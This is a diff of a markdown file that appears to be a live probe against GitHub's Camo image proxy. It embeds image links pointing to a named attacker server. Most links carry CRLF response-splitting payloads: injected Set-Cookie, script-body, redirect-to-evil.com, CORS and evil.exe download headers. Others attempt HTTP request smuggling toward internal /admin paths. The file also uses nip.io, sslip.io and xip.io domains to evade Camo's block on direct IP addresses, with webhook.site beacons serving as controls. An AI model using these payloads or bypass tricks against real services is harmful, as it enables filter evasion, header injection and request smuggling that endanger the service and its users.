@@ -1,69 +1,105 @@
-# v46: Direct IP Server Testing - CRLF & Response Manipulation
+# v47: nip.io Domain Bypass + CRLF Response Splitting
 
-> Testing with our own server at 164.90.187.218:8888
-
----
-
-## 1. Direct IP with CRLF Injection
-
-### Basic test - direct IP
-![Direct IP Test](http://164.90.187.218:8888/test.gif)
-
-### CRLF in path - Set-Cookie
-![CRLF Cookie](http://164.90.187.218:8888/img.gif%0d%0aSet-Cookie:evil=1)
-
-### CRLF - Content-Type override
-![CRLF CT](http://164.90.187.218:8888/img.gif%0d%0aContent-Type:text/html)
-
-### CRLF - Double CRLF for body injection
-![CRLF Body](http://164.90.187.218:8888/img.gif%0d%0a%0d%0a<script>alert(1)</script>)
-
-### CRLF - Location redirect
-![CRLF Redirect](http://164.90.187.218:8888/img.gif%0d%0aLocation:http://evil.com)
+> **KEY FINDING**: GitHub Camo BLOCKS direct IP addresses but allows domain names.
+> Using nip.io to create domains that resolve to our server: `164.90.187.218.nip.io`
 
 ---
 
-## 2. HTTP Request Smuggling via URL
+## 1. nip.io IP Bypass Tests
 
-### Classic CL.TE attempt
-![Smuggle 1](http://164.90.187.218:8888/img.gif%20HTTP/1.1%0d%0aHost:internal%0d%0aContent-Length:0%0d%0a%0d%0aGET%20/admin)
+### Basic - nip.io resolving to our server
+![nip test](http://164.90.187.218.nip.io:8888/nip-basic.gif)
 
-### HTTP/1.0 downgrade
-![HTTP10](http://164.90.187.218:8888/img.gif%20HTTP/1.0%0d%0a%0d%0a)
+### CRLF Set-Cookie via nip.io
+![nip cookie](http://164.90.187.218.nip.io:8888/img.gif%0d%0aSet-Cookie:evil=1)
 
-### Chunked TE smuggle
-![Chunked](http://164.90.187.218:8888/img.gif%0d%0aTransfer-Encoding:chunked%0d%0a%0d%0a0)
+### CRLF Content-Type via nip.io
+![nip ct](http://164.90.187.218.nip.io:8888/img.gif%0d%0aContent-Type:text/html)
 
----
+### CRLF Location redirect via nip.io
+![nip redir](http://164.90.187.218.nip.io:8888/img.gif%0d%0aLocation:http://evil.com)
 
-## 3. Host Header Manipulation
-
-### Host in URL path
-![Host Path](http://164.90.187.218:8888/img.gif%0d%0aHost:localhost)
-
-### X-Forwarded-Host
-![XFH](http://164.90.187.218:8888/img.gif%0d%0aX-Forwarded-Host:127.0.0.1)
+### Double CRLF body injection via nip.io
+![nip body](http://164.90.187.218.nip.io:8888/img.gif%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E)
 
 ---
 
-## 4. Control Test
+## 2. Alternative IP-to-Domain Services
 
-### Simple webhook (should always work)
-![Control](https://webhook.site/3ccdbc1c-1204-4259-942d-2be6937d8dd1/v46-control.gif)
+### sslip.io (another IP wildcard DNS)
+![sslip](http://164-90-187-218.sslip.io:8888/sslip-test.gif)
 
----
-
-## 5. Mixed Protocol Tests
-
-### HTTP on webhook (already tested HTTPS)
-![HTTP Webhook](http://webhook.site/3ccdbc1c-1204-4259-942d-2be6937d8dd1/v46-http.gif)
-
-### Direct IP no port
-![IP No Port](http://164.90.187.218/no-port.gif)
-
-### Direct IP alt port
-![IP Alt Port](http://164.90.187.218:80/port80.gif)
+### xip.io (legacy, may still work)
+![xip](http://164.90.187.218.xip.io:8888/xip-test.gif)
 
 ---
 
-**v46 - Testing with controlled server for CRLF response splitting**
+## 3. HTTP Request Smuggling via Domain
+
+### CL.TE attempt via nip.io
+![smuggle1](http://164.90.187.218.nip.io:8888/img.gif%20HTTP/1.1%0d%0aHost:internal%0d%0aContent-Length:0%0d%0a%0d%0aGET%20/admin)
+
+### Double Host header injection
+![dblhost](http://164.90.187.218.nip.io:8888/img.gif%0d%0aHost:evil.com)
+
+### X-Forwarded-Host injection
+![xfh](http://164.90.187.218.nip.io:8888/img.gif%0d%0aX-Forwarded-Host:127.0.0.1)
+
+---
+
+## 4. Port Variations via nip.io
+
+### Port 80 (standard HTTP)
+![port80](http://164.90.187.218.nip.io/port80-test.gif)
+
+### Port 8080 (common alt port)
+![port8080](http://164.90.187.218.nip.io:8080/port8080-test.gif)
+
+### Port 443 as HTTP (not HTTPS)
+![port443http](http://164.90.187.218.nip.io:443/port443http.gif)
+
+---
+
+## 5. Subdomain Variations
+
+### Subdomain before IP
+![subdom1](http://test.164.90.187.218.nip.io:8888/subdomain-test.gif)
+
+### Multiple subdomains
+![subdom2](http://a.b.c.164.90.187.218.nip.io:8888/multi-subdomain.gif)
+
+### Hyphenated IP format (sslip.io style)
+![hyphen](http://164-90-187-218.sslip.io:8888/hyphen-format.gif)
+
+---
+
+## 6. Control Tests
+
+### Webhook.site control (should always work)
+![control](https://webhook.site/f9880a9d-a4ca-4ed8-a559-f066430098db/v47-control.gif)
+
+### HTTP webhook (vs HTTPS)
+![http-control](http://webhook.site/f9880a9d-a4ca-4ed8-a559-f066430098db/v47-http.gif)
+
+---
+
+## 7. Advanced CRLF Payloads via nip.io
+
+### Triple header injection
+![triple](http://164.90.187.218.nip.io:8888/x%0d%0aSet-Cookie:a=1%0d%0aSet-Cookie:b=2%0d%0aX-Custom:pwned)
+
+### Cache-Control manipulation
+![cache](http://164.90.187.218.nip.io:8888/x%0d%0aCache-Control:no-store%0d%0aX-Cache-Status:bypass)
+
+### Access-Control (CORS) injection
+![cors](http://164.90.187.218.nip.io:8888/x%0d%0aAccess-Control-Allow-Origin:*)
+
+### Content-Disposition for download
+![download](http://164.90.187.218.nip.io:8888/x%0d%0aContent-Disposition:attachment;filename=evil.exe)
+
+---
+
+**v47** - Testing nip.io IP bypass to use controlled server for CRLF response analysis
+
+Server: `164.90.187.218:8888` (PH4N70M droplet)
+Logs: `/tmp/server.log`
